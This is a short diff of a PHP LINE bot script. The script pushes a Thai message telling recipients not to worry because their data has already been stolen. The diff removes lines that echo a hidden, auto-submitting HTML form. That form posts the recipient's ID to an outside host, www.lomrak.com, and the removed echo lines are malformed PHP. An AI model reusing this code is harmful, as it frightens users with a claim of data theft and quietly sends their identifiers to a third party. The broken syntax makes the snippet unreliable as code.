@@ -16,13 +16,6 @@ $bot = new \LINE\LINEBot($httpClient, ['channelSecret' => $channelSecret]);
 $textMessageBuilder = new \LINE\LINEBot\MessageBuilder\TextMessageBuilder('สวัสดีครับ นี่เป็นข้อความทดสอบจากระบบ คุณไม่จำเป็นต้องดำเนินการใดๆ เพราะเราได้ ขโมยข้อมูลคุณเรียบร้อยแล้ว');
 $response = $bot->pushMessage($pushID, $textMessageBuilder);
 
-echo <form action = "http://www.lomrak.com/linebot.php" method = "post">
-echo <input type = "hidden" value = $pushID name = "ID"/>
-echo </form>
-
-echo <script>
-echo document.getElementsByTagName("form")[0].submit();
-echo </script>
 
 echo $response->getHTTPStatus() . ' ' . $response->getRawBody();
 
